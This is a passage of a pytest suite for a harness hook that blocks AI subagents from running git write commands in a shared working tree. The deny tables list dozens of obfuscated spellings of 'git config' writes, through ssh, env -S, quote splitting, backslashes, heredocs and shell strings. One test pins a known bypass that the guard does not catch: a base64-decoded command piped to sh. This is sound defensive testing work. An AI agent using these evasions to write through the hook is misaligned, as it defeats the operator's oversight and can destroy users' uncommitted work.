        "GIT_CONFIG_PARAMETERS=\"'alias.c=config'\" git c user.name x",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.c GIT_CONFIG_VALUE_0=' config' git c user.name x",
    ],
    # nexus-dsr6a confirmation: the get-read exemption in non-plain text reads
    # only exact read flags. A valued flag's value is free text a quote can give
    # whitespace (`-f 'x --get'` is one file name, so the `--get` the scan saw is
    # not a flag), and a `$` or braces in the flag run could be anything.
    "config_get_exemption_is_exact": [
        "git config -f 'x --get' user.name x",
        "git config --file='x --get' user.name x",
        "git config --default \"$x\" --get user.name",
        "git config --get " + D + "x user.name",
        "git config " + D + "x --get user.name",
        "git config {--get,--unset} user.name",
        "git config --glo'bal' user.name x",
    ],
    # nexus-gvg6t: a dashed `git-config` program is a config command whatever is
    # quoted or expanded around it. In text the quote-aware tokenizer cannot read
    # (a `$`, a backslash) the strict rule used to miss it: `config` in
    # `git-config` is glued to `-`, which the standalone test excludes.
    "config_dashed_program_in_unreadable_text": [
        'git-config user.name "' + D + 'x"',
        'git-config --global user.name "' + D + '(whoami)"',
        '/usr/bin/git-config user.name "A ' + D + 'B"',
        "/usr/lib/git-core/git-config 'user.name' " + D + "x",
        "git-config user.name " + BS + "x",
        "git-config user.name x" + BS + " y",
        "git-config.exe user.name " + D + "x",
        # and the quoted forms the tokenizer reads: a write
        'git-config user.name "A B"',
        'git-config --global user.name "A B"',
        '/usr/bin/git-config user.name "A B"',
        "git-config 'user.name' x",
    ],
    # nexus-gvg6t: text the tokenizer cannot read exactly takes the strict rule,
    # as before: an unclosed quote, a backslash or `$` outside data, an unquoted
    # heredoc delimiter, a heredoc with no terminator. A quote glued to a word
    # joins it as in the shell (`con"fig"` is `config`), so those still deny as
    # the verb they spell.
    "config_tokenizer_gives_up": [
        "git config user.name 'x",
        'git config user.name "x',
        "git config user.name x'",
        "git con'fig' user.name x",
        'git con"fig" user.name x',
        'git config user.name "a"b',
        "git config user.name a'b'",
        "git config user.name 'a'" + BS + "'" + "'b'",
        'git config user.name "' + D + '(whoami)"',
        'git config user.name "' + BT + 'whoami' + BT + '"',
        'git config user.name "a ' + BS + ' b"',
        'git config user.name "' + D + 'x" ; git commit -m "ok"',
        "git config user.name x <<EOF\nbody\nEOF",
        "git status; cat <<'EOF'\ngit config user.name x",
        "git status; cat <<'EOF'\nconfig\nno terminator here",
        "git config user.name <<'EOF'\nx\nEO",
        'git "$(cat <<\'EOF\'\nconfig\nEOF\n)x" user.name y',
        'git config user.name "$(cat <<\'EOF\'\nx\nEOF\n) y"',
    ],
    # nexus-gvg6t: quoted data is data to THIS shell, but not to a consumer that
    # runs its argument as a command (ssh, git submodule foreach, git rebase -x,
    # tmux send-keys, a heredoc fed to ssh). A `git config` write spelled out in
    # data denies, with the same cursor; text a cursor cannot count (`$`, braces,
    # globs) takes the strict rule.
    "config_quoted_data_a_consumer_runs": [
        "ssh localhost 'git config user.name x'",
        'ssh localhost "git config user.name x"',
        "git submodule foreach 'git config user.name x'",
        "git submodule foreach --recursive \"git config core.hooksPath /tmp/x\"",
        "git rebase -x 'git config user.name x' HEAD~1",
        "tmux send-keys 'git config user.name x' Enter",
        "ssh localhost 'git con\"\"fig user.name x'",
        "ssh localhost 'git con" + BS + "fig user.name x'",
        "ssh localhost 'git config {user.name,x}'",
        "ssh localhost 'git config user.* x'",
        "ssh localhost 'git " + D + "(basename /x/config.py .py) user.name x'",
        "ssh localhost 'git " + D + "(echo config) user.name x'",
        "ssh localhost 'git -c a.b=c config user.name x'",
        "ssh localhost 'cd /x && git config --global user.name x'",
        "ssh localhost 'git-config user.name x'",
        "ssh localhost 'git config user.name x' # and a comment",
        "ssh localhost <<'EOF'\ngit config user.name x\nEOF",
        "ssh localhost <<'EOF'\ncd /x\ngit config --global core.hooksPath /tmp/x\nEOF",
        "ssh localhost bash -s <<'EOF'\ngit config user.name x\nEOF",
        "git status; ssh localhost <<'EOF'\ngit config user.name x\nEOF\ngit log",
        "git log -1 --format='%s config' && ssh localhost 'git config user.name x'",
    ],
    # nexus-gvg6t review B1: a fully quoted global option before `config` is one
    # opaque word to the tokenizer. The cursor used to take it for the
    # subcommand, so the `config` after it read as an argument and passed.
    "config_quoted_global_option_before_config": [
        "git '--git-dir=.git' config user.name pwned",
        'git "--git-dir=.git" config user.name pwned',
        "git '--git-dir=.git' config core.hooksPath /tmp/evil",
        "git '--work-tree=.' config user.name pwned",
        "git '--namespace=a' config user.name pwned",
        "git '--exec-path=/x' config user.name pwned",
        "git -c user.x=1 '--git-dir=.git' config user.name pwned",
        "git -C . '--git-dir=.git' config user.name pwned",
        # glued to a quote: still one opaque option word
        'git --git-dir"=.git" config user.name pwned',
        "git '--git-dir=.git' config --add alias.x '!id'",
        # these write elsewhere or die first, so the real-git test lists them apart
        'git "--config-env=core.x=FOO" config user.name pwned',
        "git '--git-dir=.git' config --global user.name pwned",
    ],
    # nexus-gvg6t review B1: a quoted word in the subcommand slot may be anything
    # (git itself rejects these three, so no real-git run); `config` after it is
    # not provably an argument.
    "config_quoted_word_in_subcommand_slot": [
        "git ' ' config user.name pwned",
        "git '' config user.name pwned",
        "git 'x y' config user.name pwned",
    ],
    # nexus-gvg6t review B2: `''` or `""` glued to a neighbour is part of a word, so
    # a `#` after it is not a comment (in the shell `''#` is the word `#`).
    "config_glued_empty_string_is_not_a_comment_start": [
        "echo ''#;git config user.name pwned",
        'echo ""#;git config user.name pwned',
        "echo ''# ; git config user.name pwned",
        "echo a ''#b;git config user.name pwned",
    ],
    # nexus-gvg6t review B4: a consumer runs its quoted argument as a command, and
    # the quotes can split the spelling of `git` or the command itself across
    # strings; the consumer joins its arguments, so no string holds the whole write.
    "config_split_spelling_in_data_a_consumer_runs": [
        "git rebase -x 'g''it config user.name x' HEAD~1",
        "git filter-branch --tree-filter 'gi\"\"t config user.name x' HEAD~1..HEAD",
        "git submodule foreach 'g''it config user.name x'",
        "git submodule foreach 'gi\"\"t config user.name x'",
        "git submodule foreach \"gi''t config user.name x\"",
        "ssh localhost 'gi\"\"t config user.name x'",
        "ssh localhost <<'EOF'\ngi\"\"t config user.name x\nEOF",
        "ssh localhost \"" + D + "(cat <<'EOF'\ngi''t config user.name x\nEOF\n)\"",
        "tmux send-keys 'git config' ' user.name x' Enter",
        "tmux send-keys 'git' ' ' 'config' ' user.name x'",
        "ssh localhost 'git config' user.name x",
        "ssh localhost 'git config user.name' x",
        "ssh localhost 'cd r && git config' user.name x",
        "ssh localhost 'git' config user.name x",
        "git rebase '--exec=g''it config user.name x' main",
    ],
    # nexus-gvg6t review B5: `git-config` is a program only in command position;
    # still a write there, whatever wraps it.
    "config_dashed_program_in_command_position": [
        "git-config user.name x",
        "sudo git-config user.name x",
        "env A=1 git-config user.name x",
        "echo hi; git-config user.name " + D + "x",
        "true && git-config user.name '" + D + "x'",
        "if true; then git-config user.name x; fi",
        "FOO=1 /usr/bin/git-config user.name " + D + "x docs/*.md",
        # nexus-gvg6t confirm pass D3: a QUOTED dashed word in command position is
        # the program too; only a quoted dashed word that is an argument is data
        "'git-config' user.name x",
        '"git-config" user.name x',
        "sudo 'git-config' user.name x",
        'env A=1 "git-config" user.name x',
        "xargs 'git-config' user.name x",
        "{ git-config user.name x; }",
        "true && { 'git-config' user.name x; }",
        "! git-config user.name x",
        "time git-config user.name x",
        "nohup git-config user.name x",
        "ssh localhost 'git-config' user.name x",
        "ssh localhost 'git-config user.name x'",
        "ssh localhost <<'EOF'\ngit-config user.name x\nEOF",
        "bash <<'EOF'\ngit-config user.name x\nEOF",
        "git submodule foreach 'git-config user.name x'",
        "git rebase -x 'git-config user.name x' HEAD~1",
    ],
    # nexus-gvg6t confirm pass D1: `env -S` splits its argument into words and
    # runs them, as ssh joins and runs its arguments. A write spelled in the -S
    # string (or across it and the words after it) is a config write.
    "config_env_split_string_is_a_consumer": [
        "env -S 'git config' user.name x",
        'env -S "git config" --local core.hooksPath /x',
        "env -S 'git config user.name x'",
        "env -S 'git' config user.name x",
        "env -S 'g''it config' user.name x",
    ],
    # The other spellings of the same option. Not in the real-git family: `-i`
    # empties the environment, the long form is GNU only, and `env A=1 -S` ends
    # option parsing at the assignment on some systems.
    "config_env_split_string_spellings": [
        "env -i -S 'git config' user.name x",
        "env -iS 'git config' user.name x",
        "env --split-string 'git config' user.name x",
        "env --split-string='git config' user.name x",
        "env A=1 -S 'git config' user.name x",
        "env -u HOME -S 'git config' user.name x",
        "env -S 'git config' -- user.name x",
    ],
    # nexus-gvg6t confirm pass D2: a double-quoted string is read by the shell
    # (two backslashes are one) and then by the consumer's shell (a backslash
    # before an ordinary letter is dropped), so the doubled backslash before `C`
    # reaches the consumer as one and runs as `-C`. The doubled and the single
    # backslash both deny.
    "config_backslash_in_double_quoted_consumer_text": [
        'git rebase -x "git -' + BS + BS + 'C . config user.name x" HEAD~1',
        'git submodule foreach "git -' + BS + BS + 'C . config user.name x"',
        'ssh h "git -' + BS + BS + 'C . config user.name x"',
        'watch "git -' + BS + BS + 'C . config user.name x"',
        'git rebase -x "git -' + BS + 'C . config user.name x" HEAD~1',
        'ssh h "git -' + BS + 'C . config user.name x"',
        'ssh h "git ' + BS + BS + 'config user.name x"',
        'ssh h "git config ' + BS + BS + 'user.name x"',
        'tmux send-keys "git -' + BS + BS + 'C . config user.name x" Enter',
        'ssh h "git -' + BS + BS + 'c core.x=1 config user.name x"',
        'ssh h "git -' + BS + BS + 'C . config --global user.name x"',
    ],
    # nexus-13wz1: `env -S` with the string glued to the option. The shell joins
    # `-S'git config'` into the one word `-Sgit config`, which env splits and
    # runs; the word `-Sgit` is not `git` to a token scan, so the whole line
    # read as having no git command (verbs too: `env -S'git commit -m x'`).
    "config_env_split_string_glued_to_the_option": [
        "env -S'git config' user.name x",
        'env -S"git config" user.name x',
        "env -iS'git config' user.name x",
        "env -u HOME -S'git config' user.name x",
        "env -S'git config user.name x'",
        "env -S'git' config user.name x",
        "env -Sgit config user.name x",
        "env -S'git config' --local core.hooksPath /x",
        "env -S'git commit -m x'",
        "env -Sgit commit -m x",
    ],
    # nexus-13wz1: no whole `git` word survives in the text: the doubled
    # backslash reaches the far shell as one, which drops it before a letter.
    "config_backslash_splits_the_git_word": [
        'ssh h "gi' + BS + BS + 't config user.name x"',
        'ssh h "gi' + BS + 't config user.name x"',
        'ssh h "g' + BS + BS + 'it config --global user.name x"',
        'tmux send-keys "gi' + BS + BS + 't config user.name x" Enter',
        'git submodule foreach "gi' + BS + BS + 't config user.name x"',
        'git rebase -x "gi' + BS + BS + 't config user.name x" HEAD~1',
        'watch "gi' + BS + BS + 't config user.name x"',
    ],
    # nexus-13wz1: a dashed `git-config` handed to a shell that runs it (an
    # executor makes the text non-plain, so the strict rule decides).
    "config_dashed_program_in_a_shell_string": [
        "sh -c 'git-config user.name x'",
        'bash -c "git-config user.name x"',
        "bash -c 'git-config --global user.name x'",
        "eval 'git-config user.name x'",
        "sudo sh -c 'git-config user.name x'",
        "sh -c 'true && git-config user.name x'",
        "sh -c '/usr/lib/git-core/git-config user.name x'",
    ],
    # Text that happens to contain `git` plus a verb. Over-blocking is the
    # design's stated price (a false positive costs a rephrase, a false
    # negative destroys uncommitted work); pin it so a loosening is a
    # visible decision.
    "accepted_false_positives": [
        "git log --grep=commit",
        'echo "later run git commit -m x',
        "\n".join(["python3 - <<'EOF'", "print('as text only: git checkout -- t3.py')", "EOF"]),
        "git status && echo add${item} to list",
        "git log file${i}.txt",
        "make i${n}t",
        "ls ~/git/ && echo add",
        "cd ~/git && echo add",
        # nexus-dsr6a: `config` after git reads as the verb when it is the
        # subcommand slot's word, wherever the command sits, and a read that
        # pipes into a non-filter is unprovable.
        "echo git config user.name x",
        "git config --get user.name | sort",
        # nexus-dsr6a: a standalone `config` word reads as the verb in text that
        # can rebuild a word, whatever it follows.
        "git show HEAD:config | sort",
        # nexus-0l6zh: the same no-position-analysis price for gh and hub.
        "echo 'gh pr checkout' > notes.txt",
        "gh pr view 5 && echo pr checkout",
        "cd ~/bin/gh && echo repo sync",
    ],
}


@pytest.mark.parametrize("family", sorted(_DENY_FAMILIES))
def test_subagent_is_denied_in_the_shared_tree(family, shared_repo):
    cmds = [c.replace("{repo}", str(shared_repo)) for c in _DENY_FAMILIES[family]]
    leaked = _not_denied(cmds, shared_repo)
    assert not leaked, f"[{family}] subagent command(s) were NOT denied in the shared tree: {leaked!r}"


def test_the_2026_08_20_incident_commands_are_denied(shared_repo):
    """The three byte-for-byte Bash invocations from the incident that filed
    nexus-3c92m: quoting and delimiter subtleties are this guard's repeat
    failure class, so the literal bytes are pinned, not a paraphrase."""
    fixtures = runpy.run_path(str(PROJECT_ROOT / "tests" / "fixtures" / "incident_3c92m_commands.py"))
    names = ["INCIDENT_CMD_1", "INCIDENT_CMD_2", "INCIDENT_CMD_3"]
    leaked = _not_denied([fixtures[n] for n in names], shared_repo)
    assert not leaked, f"incident command(s) were allowed: {[names[[fixtures[n] for n in names].index(c)] for c in leaked]}"


# ---------------------------------------------------------------------------
# ALLOW tables.
# ---------------------------------------------------------------------------

_ALLOW_FAMILIES: dict[str, list[str]] = {
    "read_only_git": [
        "git status",
        "git diff",
        "git log --oneline -5",
        "git show HEAD",
        "git show HEAD:src/nexus/upgrade_finish.py",
        "git blame t3.py",
        "git rev-parse HEAD",
        "git ls-files",
        # The verb scan looks AFTER the first git command only.
        "echo add && git status",
        "git diff -- \"" + D + "(pwd)/f\"",
        "git log " + D + "REV",
        "git st" + D + "(echo a)tus",
    ],
    # nexus-dsr6a: reading config stays allowed, in a command that cannot
    # rebuild text. A subagent needs `git config --get remote.origin.url` and
    # `git config user.name` to do its work; the writes are denied above.
    "config_reads_stay_allowed": [
        "git config user.name",
        "git config core.hooksPath",
        "git config remote.origin.url",
        "git config --get user.name",
        "git config --get-all remote.origin.fetch",
        "git config --get-regexp remote",
        "git config --get-regexp '^remote" + BS + ".'",
        "git config --get-urlmatch http.sslVerify https://example.com",
        "git config --list",
        "git config -l",
        "git config --list --show-origin",
        "git config --list --show-scope",
        "git config --show-origin user.name",
        "git config --show-origin --show-scope --get user.name",
        "git config --name-only --get-regexp remote",
        "git config --null --list",
        "git config -z -l",
        "git config --bool core.bare",
        "git config --type=bool --get core.bare",
        "git config --type bool --get core.bare",
        "git config --get --default fallback user.name",
        "git config --includes --get user.name",
        "git config --get remote.origin.fetch '^+'",
        # scope flags with a read
        "git config --global --get user.name",
        "git config --global user.name",
        "git config --global --list",
        "git config --system -l",
        "git config --local --get remote.origin.url",
        "git config --worktree --list",
        # --file / -f with a read (a write through them denies)
        "git config --file {repo}/.git/config --get user.name",
        "git config --file={repo}/.git/config --list",
        "git config -f /tmp/x/cfg -l",
        "git config --blob HEAD:.gitmodules --list",
        # the git 2.46 subcommand forms
        "git config get user.name",
        "git config get --all remote.origin.fetch",
        "git config get --regexp remote",
        "git config get --show-names --regexp remote",
        "git config get --default x user.name",
        "git config get --global user.name",
        "git config list",
        "git config list --show-origin",
        "git config list --global",
        "git config list --name-only",
        # placement and wrappers
        "git -C {repo} config --get remote.origin.url",
        "git -C {repo} config user.name",
        "git -c a.b=c config --get user.name",
        "git --no-pager config --list",
        "FOO=1 git config --get user.name",
        # redirects to /dev/null, safe sinks and joins
        "git config --get remote.origin.url 2>/dev/null",
        "git config --get remote.origin.url &>/dev/null",
        "git config --get remote.origin.url 2>&1",
        "git config --list | grep user",
        "git config --list | head -20",
        "git config --list | grep -c remote | tr -d ' '",
        "git config --get a; git config --get b",
        "git config --get a && git status",
        "git status && git config --get user.name",
        "git config --get user.name || echo unset",
        "(git config --get user.name)",
        "{ git config --get user.name; }",
        "git config --get user.name < /dev/null",
        # `config` as a path, a word or a non-git command's argument
        "git log --grep config",
        "git grep config src/",
        "git log -- config",
        "git ls-files config",
        "git diff -- src/config.py",
        "git diff -- pyproject.toml conexus/config/settings.yaml",
        "git log --oneline -- conexus/config/",
        "git show HEAD:src/config.yaml",
        "git status && cat .git/config",
        "cat .git/config",
        "echo config && git status",
        "nx config get x",
        "uv run nx config list | head",
        "grep -rn config src tests",
        "git status; grep config a b",
        "ls .config/git/config",
        "cat ~/.gitconfig",
        # Another git subcommand whose ARGUMENT is the word config is not the
        # config verb (the relaxed rule reads the subcommand slot).
        "git grep config src tests",
        "git grep -n config -- conexus/",
        "git log --grep config --since=1.day",
        "git log --grep=config --oneline",
        "git log -S config --oneline",
        "git log -G config --stat",
        "git -C {repo} log -S config --oneline",
        "git -c a.b=c grep config",
        "git -C config status",
        "git status config",
        # Text that can rebuild a word (a pipe into a non-filter, a redirect to
        # a file, a `$`) is held to the strict rule, which counts only a
        # STANDALONE `config` word: a path, file stem or identifier containing
        # it does not count.
        "git diff -- src/config.py | sort",
        "git log -- conexus/config/ | awk 1",
        "git show HEAD:src/nexus/config.py > /tmp/c.py",
        "git show HEAD:src/nexus/config.py | sed -n 1,10p",
        "git log -1; ls ~/.config/nexus | sort",
        "git diff main -- conexus/config/ | wc -l",
        "git diff -- db-config.sh config_cmd.py | sort",
        "git diff -- .git/config | sort",
        "git log -1 && cat ~/.ssh/config | sort",
        "git log -1 && python3 -c 'import config_loader' | sort",
        # Quotes and braces make a WRITE unprovable; a get/list read does not
        # care how many words it has.
        "git config --get user.name ';x'",
        "git config --get-all 'remote.origin.fetch'",
        "git config --get-regexp 'user.*'",
        "git config --list ' '",
        "git config get 'user.name'",
        "git config list '{a,b}'",
        "git config --get user.{name,email}",
        # nexus-dsr6a confirmation: a quote in ANOTHER command does not make a
        # get read unprovable (the exemption reads the flags after `config`).
        "git config --get user.name || echo \"no name\"",
        "echo \"x\" && git config --get user.name",
        "git config --list; echo 'done'",
        "git -c 'core.pager=less -R' config --list",
        "git -C '' config --get user.name",
    ],
    # nexus-gvg6t: single-quoted text, a double-quoted string with no `$`, backtick
    # or backslash in it, and a quoted-delimiter heredoc body are data: no
    # expansion is possible in them, so the word `config` there is a search term,
    # a message or a file name, not a verb. The cursor reads each as ONE word.
    "config_quoted_text_is_data": [
        # nexus-gvg6t review B5: a dashed name is an argument here, not a program
        'grep -n "git-config" docs/*.md',
        "rg 'git-config' docs/*.md",
        "grep -rn git-config docs/*.md src",
        "man git-config docs/*.md",
        # nexus-gvg6t review B1: a quoted word AFTER the subcommand stays data
        "git log --grep='x y' --oneline",
        'git grep "config" -- "a b"',
        "git log -n 3 --grep=\"config\" -- 'a b'",
        'git grep "config"',
        "git grep 'config' src",
        'git log --grep="config" --oneline',
        "git log --grep='config' --oneline",
        "git log --grep 'fix(config)' --oneline",
        'git log --grep="it' + "'" + 's config"',
        "git log --grep='say \"config\"'",
        'git log -S"config" --oneline',
        'grep -rn "git config" docs',
        "grep -rn 'git config' docs",
        'git ls-files | grep "config"',
        'git ls-files | grep -v "config" | head',
        "git diff -- 'conexus/config/' | wc -l",
        'git -C "{repo}" status',
        "git -C '{repo}' log -S config --oneline",
        'git show "HEAD:src/nexus/config.py" | sed -n 1,10p',
        "git status; echo 'config'",
        "echo 'git config'",
        'echo "git config user.name"',
        'git log -1 --format="%s" -- "config"',
        # a quote glued to a word joins it, as in the shell
        "git show HEAD:'src/nexus/config.py'",
        "git log --grep=x'config'y --oneline",
        'git log --grep="a"b --oneline',
        "git grep -n 'con''fig' src",
        # a quoted bare-key read, and a read beside any quoted text
        'git config "user.name"',
        "git config 'user.name'",
        "git config 'remote.origin.url'",
        'git config user.name || echo "no name"',
        'echo "x" && git config user.name',
        'git config core.hooksPath; echo "---"',
        "git config --get 'user.name' || echo 'unset'",
        "git config --file 'x' --get user.name 'y'",
        "git config --get-regexp '^remote' | head",
        "git config --get --default 'a b' user.name",
        "git config --type 'bool' --get core.bare",
        'git -c "core.pager=less -R" config --list',
        # a heredoc body is data when its delimiter is quoted
        "cat <<'EOF'\nthe config file\nEOF",
        "git log -1; cat <<'EOF'\nfix(config): handle x\nEOF",
        "git log -1; cat <<\"EOF\"\nfix(config): handle x\nEOF",
        "git log -1; cat <<" + BS + "EOF\nfix(config): handle x\nEOF",
        "git log -1; cat <<-'EOF'\n\tfix(config): handle x\n\tEOF",
        "git log -1; cat <<'EOF' | head -3\nconfig.py and config.yml\nEOF",
        "git log -1; cat <<'EOF'\nuse git config here\nEOF",
        "git log -1; cat <<'EOF'\n" + D + "(this) " + BT + "that" + BT + " config\nEOF",
        "git log -1; cat <<'A' <<'B'\nconfig\nA\nconfig\nB",
        "git grep -n config <<< 'a config line'",
        # a comment is not an argument
        "git config user.name # c",
        "git config user.name # set it to x",
        "git config --get user.name # config",
        "git config user.name   # c d e f",
        "git log -1 # git config user.name x",
        "git status\n# git config user.name x\ngit log -1",
        "git config core.hooksPath # why",
        "git config user.name #c",
    ],
    # nexus-gvg6t confirm pass D3: the NAME `git-config` quoted as an argument, or
    # as prose or a data string no consumer runs, is not a program. The base
    # guard allowed every one of these; a dashed word is a verb in command
    # position (or after a word that runs its arguments), not wherever it sits.
    "config_quoted_dashed_name_is_an_argument": [
        'git log --grep="git-config" --oneline',
        "git log --grep='git-config' --oneline",
        'grep -rn "git-config" docs/ src/',
        'rg -n "git-config" docs src',
        'find . -name "git-config*" -type f',
        'git grep -n "git-config" -- docs',
        'gh pr create --title "git-config" --body "x"',
        'echo "git-config is documented"',
        "echo 'git-config user.name x'",
        # nexus-13wz1: the same prose with more words, and a read through a glued -S
        "echo 'use git-config user.name x now'",
        "printf '%s\\n' 'git-config user.name x'",
        "echo 'git-config --global user.name x'",
        "env -S'git log' --oneline",
        "env -Sgit status",
        'man "git-config" docs',
        'ls "/usr/lib/git-core/git-config" docs',
        'cat "git-config" x y',
        'printf "%s %s\\n" "git-config" "x"',
        'grep -n "git-config" a b',
        'git diff -- "git-config" docs',
        'git show "HEAD:git-config" -- docs',
        'git log -S"git-config" --oneline',
        "cat <<'EOF'\ngit-config user.name x\nEOF",
        'git status; echo "git-config" "user.name x"',
        'sed -n "/git-config/p" a b',
        # `env` without -S runs no split string (nexus-gvg6t confirm pass D1)
        "env FOO=1 git log",
        "env -i git status",
        "env -i FOO=1 git log --oneline -n 1",
        'env LC_ALL=C git log --grep="git-config" --oneline',
        "env -u HOME git status",
        "env -C /tmp ls",
    ],
    "not_git": [
        "ls -la && echo commit",
        "ls",
        "\n".join(["cd {repo}", "echo hi", "ls -la"]),
        'cat <<< "hello world"',
        # `git` inside a path or a word is not the git command.
        "grep -n add .github/workflows/ci.yml",
        "ls .github && echo commit",
        "grep -rn checkout ~/git/nexus/.github/workflows",
        "cat conexus/hooks/nexus-git-policy.py | grep reset",
        "ls /Users/x/git/nexus-git-policy.py && echo reset",
        "ls .git && echo commit",
        "ls -la ~/git/nexus/.git/hooks && echo commit",
        "cd ~/git/nexus && grep -n add x",
        "cat docs/git-workflow.md | grep commit",
        "cat .gitignore | grep add",
        "grep digit x | grep add",
        "python git.py add",
        "ls nexus-git-policy.py file${i}.txt",
    ],
    # nexus-7mgnd: the measured, literal exemptions, in a command that cannot
    # rebuild text. Anything else glued to a path still denies (see
    # glued_verbs_accepted_price).
    "exempt_literals": [
        "git config core.hooksPath",
        "git config core.hooksPath; ls .git/hooks/post-commit",
        "git status && ls .git/hooks/post-commit",
        "git rev-parse --git-dir && cat .git/hooks/post-checkout",
        "nx hooks status; git status; ls .git/hooks/post-merge",
        "git status; ls /Users/x/repo/.git/hooks/post-commit.sample",
        "git status; cat ../.git/hooks/pre-push",
        "git status; (ls .git/hooks/post-commit)",
        "git diff-tree --no-commit-id --name-only -r HEAD",
        "git log --abbrev-commit --oneline -3",
        "git rev-list HEAD --abbrev-commit --abbrev=7 2>/dev/null | grep -x 76bbfac",
        "git merge-base --is-ancestor HEAD origin/develop",
        "git merge-base HEAD origin/develop",
        "git merge-tree HEAD origin/develop topic",
        "git merge-base HEAD main; echo merge-base",
        "git -C /x merge-base --is-ancestor a b && echo yes || echo no",
        "cd /x || exit 1; git status --short && echo ---BASE--- && git merge-base HEAD develop 2>/dev/null",
        "git merge-base HEAD develop 2>&1 | head -5",
        "git merge-base --is-ancestor a b &>/dev/null; git log | tail -3 | wc -l",
        "git merge-base A B | cut -c1-8",
        "git merge-base A B | tr a-f A-F | cat",
    ],
    # nexus-0l6zh: gh and hub work that leaves HEAD and the tree alone.
    "gh_and_hub_that_do_not_move_head": [
        "gh pr view 5",
        "gh pr -R Hellblazer/nexus view 5",
        "gh pr --repo Hellblazer/nexus comment 5 --body checkout",
        "gh pr list --state open",
        "gh pr checks 5",
        "gh pr diff 5",
        "gh pr create --fill",
        "gh pr merge 12 --squash",
        "gh pr merge 12 --auto --merge",
        "gh pr comment 5 -b 'checkout later'",
        "gh issue develop 12",
        "gh issue develop 12 --name my-branch-d",
        "gh repo view Hellblazer/nexus",
        "gh repo clone Hellblazer/nexus",
        "gh api repos/Hellblazer/nexus/pulls/5",
        "gh run view 123 --log",
        "ls ~/gh/pr/checkout",
        "cat docs/gh-pr-checkout.md",
        "ls ~/hub && echo checkout",
        "ls docs/github && echo reset",
        "hub --version",
        "hub pr list",
        # `co` is a subcommand only right after gh (and its flags)
        "gh pr view 5 && echo co",
        "gh pr view co",
        "gh alias list",
        "gh pr close 5",
        "gh pr close 5 --comment bye",
        "gh pr close 5 -c bye",
        "gh pr -R Hellblazer/nexus close 5",
        # hub is a command only in command position (nexus-0l6zh, review)
        "cd hub && echo file${i}.txt",
        "cd hub && rm x",
        "echo hub; cp \"${dir}/a${n}.log\" .",
        "echo hub; rm -rf /tmp/x",
        "docker pull hub && mv a b",
        "ls hub add",
        "echo hub checkout",
        "echo hub sync",
        "ls hub && ls hub/pr",
    ],
    # Ordinary interpolation, nothing git-shaped for it to reconstruct.
    "ordinary_expansions": [
        "echo file${i}.txt",
        'cp "${dir}/a${n}.log" .',
        "tar xf pkg${ver}.tgz",
        "x=$(pwd)/sub",
        "echo a${b}c",
        "a${x}dd bystander",
        'echo "$(pwd)"',
        # Reconstructs a bare `git` with no verb after it.
        "g${x:-i}t",
        "g$(echo i)t",
        "g$'" + BS + "151't",
    ],
}


@pytest.mark.parametrize("family", sorted(_ALLOW_FAMILIES))
def test_subagent_is_allowed_in_the_shared_tree(family, shared_repo):
    cmds = [c.replace("{repo}", str(shared_repo)) for c in _ALLOW_FAMILIES[family]]
    blocked = _denied_among(cmds, shared_repo)
    assert not blocked, f"[{family}] command(s) were wrongly denied: {blocked!r}"


def test_documented_residual_decode_then_exec_is_not_caught(shared_repo):
    """A write verb delivered as encoded data never puts `git` and a verb in
    the raw text, so there is nothing to anchor on. Named in the script's
    KNOWN LIMITS; pinned so closing it is a deliberate change."""
    b64 = base64.b64encode(b"git checkout -- t3.py").decode()
    cmd = f"echo {b64} | base64 -d | sh"
    assert not _denied(cmd, shared_repo), cmd


# ---------------------------------------------------------------------------
# Who is exempt, and the boundary of the exemption.
# ---------------------------------------------------------------------------

_EXEMPTION_PROBES = [
    "git commit -m msg",
    "git add -A",
    "git checkout -- x.py",
    "git reset --hard HEAD",
    "git stash",
    "git clean -fd",
    "git switch main",
    "git ch$VARckout -- t3.py",
    "gh pr checkout 5",
    "gh repo sync",
    "gh pr merge 5 --delete-branch",
    "gh issue develop 5 --checkout",
    "hub checkout x",
]


def test_main_conversation_is_never_denied(shared_repo):
    """No ``agent_id``: the orchestrator commits and resets its own tree."""
    for cmd in _EXEMPTION_PROBES:
        out = _verdict(cmd, shared_repo, agent=False)
        assert "permissionDecision" not in out, f"main conversation was gated on {cmd!r}: {out}"


def test_a_linked_worktree_agent_owns_its_tree(linked_worktree):
    """A worktree-isolated agent's local commits are the documented harvest
    choreography; a POSITIVELY PROVEN linked worktree is the one exemption."""
    for cmd in _EXEMPTION_PROBES:
        out = _verdict(cmd, linked_worktree)
        assert "permissionDecision" not in out, f"linked-worktree agent was gated on {cmd!r}: {out}"


def test_a_payload_without_cwd_takes_the_project_from_claude_project_dir(linked_worktree, tmp_path):
    """uv launches this script with ``--directory ${CLAUDE_PLUGIN_ROOT}`` (finding C,
    nexus-f9bgu.36), so the process cwd is not the project. A payload with no
    ``cwd`` falls back to ``CLAUDE_PROJECT_DIR``, never to the process cwd."""
    elsewhere = tmp_path / "plugin-root"
    elsewhere.mkdir()
    payload = json.dumps(_payload("git commit -m msg"))
    env = {**os.environ, "NX_HOOK_PYTHON": sys.executable, "CLAUDE_PROJECT_DIR": str(linked_worktree)}
    proc = subprocess.run(
        [sys.executable, str(SCRIPT)], input=payload, capture_output=True, text=True,
        timeout=20, env=env, cwd=str(elsewhere),
    )
    assert "permissionDecision" not in _hso(proc), proc.stdout


def test_the_process_cwd_is_never_the_project(linked_worktree):
    """The control for the case above: the process cwd IS a linked worktree, the payload
    names no cwd and CLAUDE_PROJECT_DIR is unset, so the project is unknown and the
    verdict is the fail-closed one. Reading the process cwd would have exempted it."""
    payload = json.dumps(_payload("git commit -m msg"))
    env = {k: v for k, v in os.environ.items() if k != "CLAUDE_PROJECT_DIR"}
    env["NX_HOOK_PYTHON"] = sys.executable
    proc = subprocess.run(
        [sys.executable, str(SCRIPT)], input=payload, capture_output=True, text=True,
        timeout=20, env=env, cwd=str(linked_worktree),
    )
    assert _hso(proc).get("permissionDecision") == "deny", proc.stdout


@pytest.mark.parametrize(
    "cmd",
    ["git commit -m msg", "git add -A", "git checkout -- x.py", "gh pr checkout 5", "gh repo sync"],
)
def test_an_undeterminable_worktree_fails_closed(cmd, tmp_path):
    """A non-repo cwd makes ``git rev-parse`` fail. Not being able to tell
    whether the tree is shared earns no pass, for index writers and
    destroyers alike."""
    not_a_repo = tmp_path / "norepo"
    not_a_repo.mkdir()
    out = _verdict(cmd, not_a_repo)
    assert out.get("permissionDecision") == "deny", f"{cmd!r} was permitted in a non-repo cwd: {out}"
    reason = out["permissionDecisionReason"].lower()
